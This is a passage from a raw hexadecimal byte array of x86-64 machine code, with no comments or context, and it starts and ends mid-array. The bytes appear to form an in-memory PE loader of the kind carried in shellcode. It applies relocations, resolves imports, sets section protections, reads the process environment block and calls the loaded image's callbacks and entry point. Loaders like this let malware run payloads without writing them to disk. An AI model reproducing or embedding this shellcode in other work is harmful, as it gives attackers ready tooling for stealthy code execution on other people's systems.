0x8b, 0xcf, 0x48, 0x89, \n  0x5c, 0x24, 0x58, 0xff, 0x96, 0x98, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, \n  0x84, 0x51, 0x08, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x58, 0x41, 0x39, 0x46, \n  0x50, 0x0f, 0x87, 0x43, 0x08, 0x00, 0x00, 0x48, 0x89, 0x7c, 0x24, 0x30, \n  0x48, 0x8d, 0x4c, 0x24, 0x68, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, \n  0x01, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x44, 0x89, 0x64, 0x24, 0x20, \n  0xba, 0x1f, 0x00, 0x0f, 0x00, 0xff, 0x96, 0x10, 0x02, 0x00, 0x00, 0x48, \n  0x8b, 0xcf, 0x8b, 0xd8, 0xff, 0x96, 0xf0, 0x00, 0x00, 0x00, 0x33, 0xff, \n  0x85, 0xdb, 0x0f, 0x85, 0x06, 0x08, 0x00, 0x00, 0x48, 0x8d, 0x9e, 0x25, \n  0x06, 0x00, 0x00, 0xff, 0x96, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4c, \n  0x24, 0x68, 0x4c, 0x8d, 0x85, 0x28, 0x03, 0x00, 0x00, 0xc7, 0x44, 0x24, \n  0x48, 0x04, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd0, 0x89, 0x7c, 0x24, 0x40, \n  0x48, 0x8d, 0x44, 0x24, 0x50, 0x44, 0x89, 0x64, 0x24, 0x38, 0x45, 0x33, \n  0xc9, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x48, \n  0x89, 0x7c, 0x24, 0x20, 0xff, 0x96, 0x18, 0x02, 0x00, 0x00, 0x48, 0x8b, \n  0x8d, 0x28, 0x03, 0x00, 0x00, 0x4d, 0x63, 0x67, 0x3c, 0x4c, 0x03, 0xe1, \n  0x4c, 0x89, 0x64, 0x24, 0x78, 0x85, 0xc0, 0x74, 0x0b, 0x3d, 0x03, 0x00, \n  0x00, 0x40, 0x0f, 0x85, 0x9a, 0x07, 0x00, 0x00, 0x48, 0x85, 0xc9, 0x0f, \n  0x84, 0x91, 0x07, 0x00, 0x00, 0x40, 0x38, 0x3b, 0x74, 0x65, 0x48, 0x8b, \n  0x54, 0x24, 0x50, 0x4c, 0x8d, 0x8d, 0x10, 0x03, 0x00, 0x00, 0xbf, 0x04, \n  0x00, 0x00, 0x00, 0x44, 0x8b, 0xc7, 0xff, 0x56, 0x60, 0x49, 0x8d, 0x5e, \n  0x54, 0x44, 0x8b, 0xcf, 0x8b, 0x13, 0x33, 0xc9, 0x41, 0xb8, 0x00, 0x30, \n  0x00, 0x00, 0x48, 0x89, 0x5c, 0x24, 0x70, 0xff, 0x56, 0x48, 0x44, 0x8b, \n  0x03, 0x48, 0x8b, 0xc8, 0x48, 0x8b, 0x95, 0x28, 0x03, 0x00, 0x00, 0x48, \n  0x89, 0x44, 0x24, 0x58, 0xe8, 0xe7, 0x15, 0x00, 0x00, 0x44, 0x8b, 0x44, \n  0x24, 0x50, 0x33, 0xd2, 0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0xe8, \n  0xf4, 0x15, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0x33, \n  0xff, 0xeb, 0x15, 0x48, 0x8b, 0x85, 0x18, 0x03, 0x00, 0x00, 0x49, 0x8d, \n  0x5e, 0x54, 0x48, 0x89, 0x5c, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x58, \n  0x44, 0x8b, 0x03, 0x49, 0x8b, 0xd7, 0xe8, 0xa9, 0x15, 0x00, 0x00, 0x48, \n  0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, 0x44, 0x8b, 0xff, 0x49, 0x89, 0x44, \n  0x24, 0x30, 0x41, 0x0f, 0xb7, 0x44, 0x24, 0x14, 0x48, 0x83, 0xc0, 0x18, \n  0x49, 0x03, 0xc4, 0x48, 0x89, 0x45, 0x90, 0x66, 0x41, 0x3b, 0x7c, 0x24, \n  0x06, 0x73, 0x52, 0x4c, 0x8b, 0x75, 0x80, 0x4c, 0x8b, 0xe8, 0x41, 0x8b, \n  0xc7, 0x48, 0x8d, 0x3c, 0x80, 0x41, 0x8b, 0x5c, 0xfd, 0x0c, 0x48, 0x03, \n  0x9d, 0x28, 0x03, 0x00, 0x00, 0x41, 0x8b, 0x54, 0xfd, 0x14, 0x48, 0x8b, \n  0xcb, 0x45, 0x8b, 0x44, 0xfd, 0x10, 0x49, 0x03, 0xd6, 0xe8, 0x52, 0x15, \n  0x00, 0x00, 0x0f, 0xb6, 0x03, 0x41, 0xff, 0xc7, 0x41, 0x89, 0x44, 0xfd, \n  0x08, 0x41, 0x0f, 0xb7, 0x44, 0x24, 0x06, 0x44, 0x3b, 0xf8, 0x72, 0xc2, \n  0x4c, 0x8b, 0x75, 0x88, 0x33, 0xff, 0x4c, 0x8b, 0xad, 0x18, 0x03, 0x00, \n  0x00, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, 0x8b, 0x85, 0x20, 0x03, \n  0x00, 0x00, 0x4d, 0x8b, 0xd0, 0x4d, 0x2b, 0x56, 0x30, 0x85, 0xc0, 0x0f, \n  0x84, 0xf2, 0x00, 0x00, 0x00, 0x4d, 0x85, 0xd2, 0x0f, 0x84, 0xe9, 0x00, \n  0x00, 0x00, 0x41, 0x8b, 0x8c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, \n  0x1c, 0x01, 0x4a, 0x8d, 0x04, 0x03, 0x4e, 0x8d, 0x0c, 0x01, 0x4c, 0x3b, \n  0xc8, 0x0f, 0x83, 0xcc, 0x00, 0x00, 0x00, 0x41, 0xbf, 0xff, 0x0f, 0x00, \n  0x00, 0x41, 0x39, 0x79, 0x04, 0x0f, 0x84, 0xbc, 0x00, 0x00, 0x00, 0x41, \n  0x8b, 0x41, 0x04, 0x4d, 0x8d, 0x59, 0x08, 0x49, 0x03, 0xc1, 0x4c, 0x3b, \n  0xd8, 0x0f, 0x84, 0x98, 0x00, 0x00, 0x00, 0xb9, 0x02, 0x00, 0x00, 0x00, \n  0x41, 0x0f, 0xb7, 0x13, 0x8b, 0xc2, 0x41, 0x23, 0xc7, 0x41, 0x03, 0x01, \n  0x41, 0x3b, 0x44, 0x24, 0x50, 0x73, 0x6d, 0x41, 0x8b, 0x09, 0x8b, 0xc2, \n  0x49, 0x23, 0xc7, 0x66, 0xc1, 0xea, 0x0c, 0x49, 0x03, 0xc0, 0x48, 0x03, \n  0xc8, 0x66, 0x83, 0xfa, 0x0a, 0x75, 0x05, 0x4c, 0x01, 0x11, 0xeb, 0x36, \n  0xb8, 0x03, 0x00, 0x00, 0x00, 0x66, 0x3b, 0xd0, 0x75, 0x05, 0x41, 0x8b, \n  0xc2, 0xeb, 0x24, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x66, 0x3b, 0xd0, 0x75, \n  0x0c, 0x49, 0x8b, 0xc2, 0x48, 0xc1, 0xe8, 0x10, 0x0f, 0xb7, 0xc0, 0xeb, \n  0x0e, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x66, 0x3b, 0xd0, 0x75, 0x15, 0x41, \n  0x0f, 0xb7, 0xc2, 0x48, 0x01, 0x01, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, \n  0x00, 0xb9, 0x02, 0x00, 0x00, 0x00, 0xeb, 0x0c, 0x66, 0x85, 0xd2, 0x0f, \n  0x85, 0x38, 0x05, 0x00, 0x00, 0x48, 0x8b, 0xc8, 0x41, 0x8b, 0x41, 0x04, \n  0x4c, 0x03, 0xd9, 0x49, 0x03, 0xc1, 0x4c, 0x3b, 0xd8, 0x0f, 0x85, 0x6d, \n  0xff, 0xff, 0xff, 0x4a, 0x8d, 0x04, 0x03, 0x4d, 0x8b, 0xcb, 0x4c, 0x3b, \n  0xd8, 0x0f, 0x82, 0x3a, 0xff, 0xff, 0xff, 0x41, 0x8b, 0x84, 0x24, 0x90, \n  0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xb6, 0x00, 0x00, 0x00, 0x49, \n  0x8d, 0x1c, 0x00, 0x39, 0x7b, 0x0c, 0x0f, 0x84, 0xa9, 0x00, 0x00, 0x00, \n  0x4c, 0x8b, 0xb5, 0x18, 0x03, 0x00, 0x00, 0x8b, 0x53, 0x0c, 0x48, 0x8b, \n  0xce, 0x49, 0x03, 0xd0, 0xe8, 0xdf, 0x0b, 0x00, 0x00, 0x4c, 0x8b, 0x85, \n  0x28, 0x03, 0x00, 0x00, 0x4c, 0x8b, 0xe8, 0x8b, 0x3b, 0x44, 0x8b, 0x7b, \n  0x10, 0x49, 0x03, 0xf8, 0x4d, 0x03, 0xf8, 0x48, 0x8b, 0x0f, 0x33, 0xc0, \n  0x48, 0x85, 0xc9, 0x74, 0x55, 0x79, 0x08, 0x44, 0x8b, 0xc9, 0x45, 0x33, \n  0xc0, 0xeb, 0x2c, 0x4e, 0x8d, 0x24, 0x01, 0x41, 0x39, 0x46, 0x04, 0x74, \n  0x1a, 0x49, 0x8d, 0x54, 0x24, 0x02, 0x48, 0x8b, 0xce, 0xe8, 0x32, 0xf0, \n  0xff, 0xff, 0x85, 0xc0, 0x74, 0x09, 0x48, 0x8b, 0x86, 0xe0, 0x01, 0x00, \n  0x00, 0xeb, 0x13, 0x45, 0x33, 0xc9, 0x4d, 0x8d, 0x44, 0x24, 0x02, 0x49, \n  0x8b, 0xd5, 0x48, 0x8b, 0xce, 0xe8, 0x66, 0x0c, 0x00, 0x00, 0x49, 0x89, \n  0x07, 0x48, 0x83, 0xc7, 0x08, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, \n  0x49, 0x83, 0xc7, 0x08, 0xeb, 0xa1, 0x48, 0x83, 0xc3, 0x14, 0x33, 0xff, \n  0x39, 0x7b, 0x0c, 0x0f, 0x85, 0x6e, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0x75, \n  0x88, 0x4c, 0x8b, 0xad, 0x18, 0x03, 0x00, 0x00, 0x4c, 0x8b, 0x64, 0x24, \n  0x78, 0x41, 0x8b, 0x84, 0x24, 0xf0, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, \n  0x84, 0x86, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x78, 0x04, 0x49, 0x03, 0xf8, \n  0x8b, 0x07, 0x85, 0xc0, 0x74, 0x77, 0x8b, 0xd0, 0x48, 0x8b, 0xce, 0x49, \n  0x03, 0xd0, 0xe8, 0x21, 0x0b, 0x00, 0x00, 0x4c, 0x8b, 0x85, 0x28, 0x03, \n  0x00, 0x00, 0x4c, 0x8b, 0xe0, 0x33, 0xc0, 0x4d, 0x85, 0xe4, 0x74, 0x4a, \n  0x8b, 0x5f, 0x0c, 0x44, 0x8b, 0x7f, 0x08, 0x49, 0x03, 0xd8, 0x4d, 0x03, \n  0xf8, 0xeb, 0x33, 0x79, 0x08, 0x44, 0x8b, 0x0b, 0x4c, 0x8b, 0xc0, 0xeb, \n  0x0a, 0x49, 0x83, 0xc0, 0x02, 0x44, 0x8b, 0xc8, 0x4c, 0x03, 0xc1, 0x49, \n  0x8b, 0xd4, 0x48, 0x8b, 0xce, 0xe8, 0xca, 0x0b, 0x00, 0x00, 0x49, 0x89, \n  0x07, 0x48, 0x83, 0xc3, 0x08, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, \n  0x49, 0x83, 0xc7, 0x08, 0x33, 0xc0, 0x48, 0x8b, 0x0b, 0x48, 0x85, 0xc9, \n  0x75, 0xc5, 0x48, 0x83, 0xc7, 0x20, 0x8b, 0x07, 0x85, 0xc0, 0x75, 0x8e, \n  0x4c, 0x8b, 0x64, 0x24, 0x78, 0x33, 0xff, 0x45, 0x8b, 0x64, 0x24, 0x28, \n  0x48, 0x8d, 0x4d, 0xa0, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x4d, 0x03, 0xe0, \n  0x4c, 0x89, 0x65, 0x80, 0x8d, 0x50, 0x7e, 0x41, 0x0f, 0x10, 0x06, 0x41, \n  0x0f, 0x10, 0x4e, 0x10, 0x0f, 0x11, 0x01, 0x41, 0x0f, 0x10, 0x46, 0x20, \n  0x0f, 0x11, 0x49, 0x10, 0x41, 0x0f, 0x10, 0x4e, 0x30, 0x0f, 0x11, 0x41, \n  0x20, 0x41, 0x0f, 0x10, 0x46, 0x40, 0x0f, 0x11, 0x49, 0x30, 0x41, 0x0f, \n  0x10, 0x4e, 0x50, 0x0f, 0x11, 0x41, 0x40, 0x41, 0x0f, 0x10, 0x46, 0x60, \n  0x0f, 0x11, 0x49, 0x50, 0x41, 0x0f, 0x10, 0x4e, 0x70, 0x4c, 0x03, 0xf2, \n  0x0f, 0x11, 0x41, 0x60, 0x48, 0x03, 0xca, 0x0f, 0x11, 0x49, 0xf0, 0x48, \n  0x83, 0xe8, 0x01, 0x75, 0xae, 0x49, 0x8b, 0x06, 0x41, 0xb8, 0x00, 0x30, \n  0x00, 0x00, 0x48, 0x89, 0x01, 0x33, 0xc9, 0x48, 0x8b, 0x45, 0xa0, 0x48, \n  0xc1, 0xe8, 0x30, 0x44, 0x8d, 0x49, 0x04, 0x48, 0x8d, 0x14, 0x80, 0x48, \n  0xc1, 0xe2, 0x03, 0xff, 0x56, 0x48, 0x44, 0x0f, 0xb7, 0x7d, 0xa6, 0x48, \n  0x8b, 0xc8, 0x48, 0x8b, 0x55, 0x90, 0x48, 0x8b, 0xd8, 0x48, 0x89, 0x44, \n  0x24, 0x60, 0x47, 0x8d, 0x04, 0xbf, 0x41, 0xc1, 0xe0, 0x03, 0xe8, 0x15, \n  0x12, 0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x39, 0x86, 0x74, 0x05, \n  0x00, 0x00, 0x75, 0x58, 0x40, 0x38, 0xbe, 0x25, 0x06, 0x00, 0x00, 0x75, \n  0x29, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x33, 0xd2, 0x48, 0x8b, 0x8d, 0x28, \n  0x03, 0x00, 0x00, 0x44, 0x8b, 0x03, 0xe8, 0x09, 0x12, 0x00, 0x00, 0x44, \n  0x8b, 0x03, 0x49, 0x8d, 0x8d, 0x28, 0x05, 0x00, 0x00, 0x33, 0xd2, 0xe8, \n  0xf8, 0x11, 0x00, 0x00, 0xeb, 0x21, 0x48, 0x8b, 0x44, 0x24, 0x58, 0x48, \n  0x85, 0xc0, 0x74, 0x1c, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x48, 0x8b, 0xd0, \n  0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0x44, 0x8b, 0x03, 0xe8, 0xb5, \n  0x11, 0x00, 0x00, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x40, 0x38, 0xbe, 0x25, \n  0x06, 0x00, 0x00, 0x0f, 0x85, 0x8a, 0x00, 0x00, 0x00, 0xff, 0x96, 0xb0, \n  0x00, 0x00, 0x00, 0x48, 0x8b, 0x95, 0x28, 0x03, 0x00, 0x00, 0x48, 0x8b, \n  0xc8, 0xff, 0x96, 0x20, 0x02, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xe3, \n  0x02, 0x00, 0x00, 0x48, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, 0x39, 0xbd, \n  0x20, 0x03, 0x00, 0x00, 0x48, 0x89, 0x7c, 0x24, 0x50, 0x48, 0x0f, 0x45, \n  0xc7, 0x48, 0x89, 0x85, 0x28, 0x03, 0x00, 0x00, 0xff, 0x96, 0xb0, 0x00, \n  0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x68, 0x4c, 0x8d, 0x85, 0x28, 0x03, \n  0x00, 0x00, 0xc7, 0x44, 0x24, 0x48, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8b, \n  0xd0, 0x89, 0x7c, 0x24, 0x40, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x89, 0x44, \n  0x24, 0x38, 0x45, 0x33, 0xc9, 0x48, 0x8d, 0x44, 0x24, 0x50, 0x48, 0x89, \n  0x44, 0x24, 0x30, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, \n  0x20, 0xff, 0x96, 0x18, 0x02, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0x77, \n  0x02, 0x00, 0x00, 0x48, 0x8b, 0x54, 0x24, 0x50, 0x4c, 0x8d, 0x8d, 0x10, \n  0x03, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0x41, 0xb8, \n  0x08, 0x00, 0x00, 0x00, 0xff, 0x56, 0x60, 0x44, 0x8b, 0xf7, 0x45, 0x85, \n  0xff, 0x0f, 0x84, 0xeb, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x6c, 0x24, 0x60, \n  0x48, 0x8d, 0x7b, 0x0c, 0x8b, 0x9d, 0x18, 0x03, 0x00, 0x00, 0x45, 0x33, \n  0xe4, 0x45, 0x8d, 0x54, 0x24, 0x01, 0x8b, 0x57, 0x18, 0x44, 0x8b, 0xc2, \n  0x8b, 0xca, 0x41, 0xc1, 0xe8, 0x1e, 0xc1, 0xea, 0x1d, 0x41, 0x23, 0xd2, \n  0xc1, 0xe9, 0x1f, 0x85, 0xd1, 0x0f, 0x85, 0x9a, 0x00, 0x00, 0x00, 0x41, \n  0x85, 0xd0, 0x74, 0x07, 0xbb, 0x20, 0x00, 0x00, 0x00, 0xeb, 0x46, 0x44, \n  0x8b, 0xca, 0x8b, 0xc1, 0x45, 0x33, 0xca, 0x41, 0x23, 0xc0, 0x41, 0x85, \n  0xc1, 0x74, 0x12, 0x8a, 0x86, 0x25, 0x06, 0x00, 0x00, 0xf6, 0xd8, 0x1b, \n  0xdb, 0x83, 0xe3, 0xfc, 0x83, 0xc3, 0x08, 0xeb, 0x24, 0x41, 0x33, 0xca, \n  0x41, 0x8b, 0xc0, 0x41, 0x33, 0xc2, 0x23, 0xc1, 0x85, 0xc2, 0x74, 0x07, \n  0xbb, 0x10, 0x00, 0x00, 0x00, 0xeb, 0x0e, 0x41, 0x23, 0xc8, 0xb8, 0x02, \n  0x00, 0x00, 0x00, 0x41, 0x85, 0xc9, 0x0f, 0x45, 0xd8, 0x44, 0x8b, 0x07, \n  0x41, 0x8d, 0x47, 0xff, 0x4c, 0x8b, 0x95, 0x28, 0x03, 0x00, 0x00, 0x4d, \n  0x03, 0xd0, 0x44, 0x3b, 0xf0, 0x73, 0x12, 0x41, 0x8d, 0x46, 0x01, 0x48, \n  0x8d, 0x04, 0x80, 0x41, 0x8b, 0x54, 0xc5, 0x0c, 0x49, 0x2b, 0xd0, 0xeb, \n  0x03, 0x8b, 0x57, 0x04, 0x4c, 0x8d, 0x8d, 0x10, 0x03, 0x00, 0x00, 0x44, \n  0x89, 0xa5, 0x10, 0x03, 0x00, 0x00, 0x44, 0x8b, 0xc3, 0x49, 0x8b, 0xca, \n  0xff, 0x56, 0x60, 0x41, 0xba, 0x01, 0x00, 0x00, 0x00, 0x45, 0x03, 0xf2, \n  0x48, 0x83, 0xc7, 0x28, 0x45, 0x3b, 0xf7, 0x0f, 0x82, 0x39, 0xff, 0xff, \n  0xff, 0x4c, 0x8b, 0x65, 0x80, 0x33, 0xff, 0x4c, 0x8b, 0xad, 0x18, 0x03, \n  0x00, 0x00, 0x8b, 0x55, 0xcc, 0x4c, 0x8d, 0x8d, 0x10, 0x03, 0x00, 0x00, \n  0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0x41, 0xb8, 0x02, 0x00, 0x00, \n  0x00, 0x89, 0xbd, 0x10, 0x03, 0x00, 0x00, 0xff, 0x56, 0x60, 0x48, 0x8b, \n  0x4c, 0x24, 0x78, 0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x8b, 0x81, 0xd0, \n  0x00, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0x85, 0xc0, \n  0x74, 0x27, 0x48, 0x8b, 0x5c, 0x08, 0x18, 0x48, 0x85, 0xdb, 0x74, 0x1d, \n  0xeb, 0x13, 0x45, 0x33, 0xc0, 0x41, 0x8b, 0xd6, 0xff, 0xd0, 0x48, 0x8b, \n  0x8d, 0x28, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x5b, 0x08, 0x48, 0x8b, 0x03, \n  0x48, 0x85, 0xc0, 0x75, 0xe5, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x41, 0x39, \n  0x45, 0x00, 0x0f, 0x85, 0x72, 0x01, 0x00, 0x00, 0x8b, 0x45, 0xc8, 0x45, \n  0x33, 0xc0, 0x48, 0x03, 0xc1, 0x41, 0x8b, 0xd6, 0xff, 0xd0, 0x41, 0x38, \n  0xbd, 0x0c, 0x03, 0x00, 0x00, 0x0f, 0x84, 0xca, 0x01, 0x00, 0x00, 0x8b, \n  0x45, 0x28, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, 0x49, 0x8d, 0x0c, \n  0x00, 0x85, 0xc0, 0x0f, 0x84, 0xcf, 0x01, 0x00, 0x00, 0x8b, 0x59, 0x18, \n  0x85, 0xdb, 0x0f, 0x84, 0xc4, 0x01, 0x00, 0x00, 0x8b, 0x79, 0x1c, 0x44, \n  0x8b, 0x79, 0x20, 0x49, 0x03, 0xf8, 0x44, 0x8b, 0x71, 0x24, 0x4d, 0x03, \n  0xf8, 0x4d, 0x03, 0xf0, 0x8d, 0x43, 0xff, 0x41, 0x8b, 0x0c, 0x87, 0x49, \n  0x8d, 0x95, 0x0c, 0x03, 0x00, 0x00, 0x49, 0x03, 0xc8, 0x44, 0x8b, 0xe0, \n  0x8b, 0xd8, 0xe8, 0x65, 0x0f, 0x00, 0x00, 0x4c, 0x8b, 0x85, 0x28, 0x03, \n  0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x8c, 0x00, 0x00, 0x00, 0x85, 0xdb, \n  0x75, 0xd2, 0x4c, 0x8b, 0xad, 0x18, 0x03, 0x00, 0x00, 0x4d, 0x85, 0xc0, \n  0x74, 0x53, 0x0f, 0xb7, 0x45, 0xa6, 0xbf, 0x00, 0xc0, 0x00, 0x00, 0x48, \n  0x8b, 0x4c, 0x24, 0x60, 0x44, 0x8b, 0xc7, 0x48, 0x8d, 0x14, 0x80, 0x48, \n  0xc1, 0xe2, 0x03, 0xff, 0x56, 0x50, 0x48, 0x8b, 0x44, 0x24, 0x58, 0x48, \n  0x85, 0xc0, 0x74, 0x0c, 0x8b, 0x55, 0xf4, 0x44, 0x8b, 0xc7, 0x48, 0x8b, \n  0xc8, 0xff, 0x56, 0x50, 0xff, 0x96, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8b, \n  0x95, 0x28, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xc8, 0xff, 0x96, 0x20, 0x02, \n  0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x68, 0xff, 0x96, 0xf0, 0x00, 0x00, \n  0x00, 0x45, 0x8b, 0x85, 0x24, 0x05, 0x00, 0x00, 0x49, 0x8d, 0x8d, 0x28, \n  0x05, 0x00, 0x00, 0x33, 0xd2, 0xe8, 0xc2, 0x0e, 0x00, 0x00, 0x48, 0x81, \n  0xc4, 0xc8, 0x03, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, \n  0x5c, 0x5f, 0x5e, 0x5b, 0x5d, 0xc3, 0x43, 0x0f, 0xb7, 0x04, 0x66, 0x8b, \n  0x1c, 0x87, 0x49, 0x03, 0xd8, 0x0f, 0x84, 0x67, 0xff, 0xff, 0xff, 0x4c, \n  0x8b, 0xad, 0x18, 0x03, 0x00, 0x00, 0x45, 0x33, 0xf6, 0x49, 0x8d, 0xbd, \n  0x0c, 0x04, 0x00, 0x00, 0x44, 0x38, 0x37, 0x74, 0x41, 0x45, 0x39, 0xb5, \n  0x0c, 0x05, 0x00, 0x00, 0x74, 0x22, 0x48, 0x8d, 0x85, 0xb0, 0x00, 0x00, \n  0x00, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x01, 0x00, 0x00, 0x41, 0x83, 0xc9, \n  0xff, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8b, 0xc7, 0x33, 0xd2, 0x33, \n  0xc9, 0xff, 0x56, 0x70, 0x45, 0x39, 0xb5, 0x0c, 0x05, 0x00, 0x00, 0x48, \n  0x8d, 0x8d, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x0f, 0x44, 0xcf, 0xff, 0xd3, \n  0xeb, 0x6e, 0xff, 0xd3, 0xeb, 0x6a, 0x4d, 0x8d, 0x85, 0x0c, 0x04, 0x00, \n  0x00, 0x41, 0x38, 0x38, 0x74, 0x2e, 0x48, 0x8d, 0x85, 0xb0, 0x00, 0x00, \n  0x00, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x01, 0x00, 0x00, 0x41, 0x83, 0xc9, \n  0xff, 0x48, 0x89, 0x44, 0x24, 0x20, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x56, \n  0x70, 0x48, 0x8d, 0x95, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xe8, \n  0x7c, 0x03, 0x00, 0x00, 0x41, 0x39, 0x7d, 0x04, 0x74, 0x3c, 0x48, 0x89, \n  0x7c, 0x24, 0x28, 0x45, 0x33, 0xc9, 0x4d, 0x8b, 0xc4, 0x89, 0x7c, 0x24, \n  0x20, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x96, 0x88, 0x00, 0x00, 0x00, 0x48, \n  0x85, 0xc0, 0x74, 0x0c, 0x83, 0xca, 0xff, 0x48, 0x8b, 0xc8, 0xff, 0x96, \n  0x80, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, 0xeb, \n  0x22, 0x4c, 0x8b, 0xad, 0x18, 0x03, 0x00, 0x00, 0xeb, 0xee, 0x65, 0x48, \n  0x8b, 0x0c, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x49, 0x60, 0x41, \n  0xff, 0xd4, 0xeb, 0xdc, 0x4c, 0x8b, 0xad, 0x18, 0x03, 0x00, 0x00, 0xb8, \n  0x03, 0x00, 0x00, 0x00, 0x39, 0x86, 0x30, 0x02, 0x00, 0x00, 0x0f, 0x85, \n  0x6d, 0xfe, 0xff, 0xff, 0x83, 0xc9, 0xff, 0xff, 0x56, 0x68, 0x4c, 0x8b, \n  0x85, 0x28, 0x03, 0x00, 0x00, 0xe9, 0x5b, 0xfe, 0xff, 0xff, 0xcc, 0xcc, \n  0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x20, 0x55, 0x57, \n  0x41, 0x56, 0x48, 0x8d, 0xac, 0x24, 0xc0, 0xfc, 0xff, 0xff, 0x48, 0x81, \n  0xec, 0x40, 0x04, 0x00, 0x00, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf1, 0x48, \n  0x8b, 0x91, 0x58, 0x0d, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x30, 0x00, 0x00, \n  0x33, 0xc9, 0x48, 0x8d, 0x14, 0x55, 0x02, 0x00, 0x00, 0x00, 0x44, 0x8d, \n  0x49, 0x04, 0xff, 0x56, 0x48, 0x4c, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x0f, \n  0x84, 0x94, 0x02, 0x00, 0x00, 0x8b, 0x8b, 0x24, 0x05, 0x00, 0x00, 0x4c, \n  0x8d, 0x83, 0x28, 0x05, 0x00, 0x00, 0x03, 0xc9, 0x83, 0xcb, 0xff, 0x89, \n  0x4c, 0x24, 0x28, 0x44, 0x8b, 0xcb, 0x33, 0xc9, 0x48, 0x89, 0x44, 0x24, \n  0x20, 0x33, 0xd2, 0xff, 0x56, 0x70, 0x83, 0x65, 0xe8, 0x00, 0x48, 0x8d, \n  0x45, 0x80, 0x83, 0x65, 0xf8, 0x00, 0x48, 0x8d, 0x55, 0x08, 0x48, 0x89, \n  0x45, 0xe0, 0x48, 0x8b, 0xce, 0x48, 0x8d, 0x05, 0x74, 0xdb, 0xff, 0xff, \n  0x48, 0x89, 0x75, 0x38, 0x48, 0x89, 0x45, 0x80, 0x48, 0x8d, 0x05, 0xf9, \n  0xd9, 0xff, 0xff, 0x48, 0x89, 0x45, 0x88, 0x48, 0x8d, 0x05, 0x56, 0xda, \n  0xff, 0xff, 0x48, 0x89, 0x45, 0x90, 0x48, 0x8d, 0x05, 0xd3, 0xda, 0xff, \n  0xff, 0x48, 0x89, 0x45, 0x98, 0x48, 0x8d, 0x05, 0x50, 0xda, 0xff, 0xff, \n  0x48, 0x89, 0x45, 0xa0, 0x48, 0x8d, 0x05, 0x41, 0xda, 0xff, 0xff, 0x48, \n  0x89, 0x45, 0xa8, 0x48, 0x8d, 0x05, 0x36, 0xda, 0xff, 0xff, 0x48, 0x89, \n  0x45, 0xb0, 0x48, 0x8d, 0x05, 0x2b, 0xda, 0xff, 0xff, 0x48, 0x89, 0x45, \n  0xb8, 0x48, 0x8d, 0x05, 0xb8, 0xda, 0xff, 0xff, 0x48, 0x89, 0x45, 0xc0, \n  0x48, 0x8d, 0x05, 0x15, 0xda, 0xff, 0xff, 0x48, 0x89, 0x45, 0xc8, 0x48, \n  0x8d, 0x05, 0x0a, 0xda, 0xff, 0xff, 0x48, 0x89, 0x45, 0xd0, 0x48, 0x8d, \n  0x44, 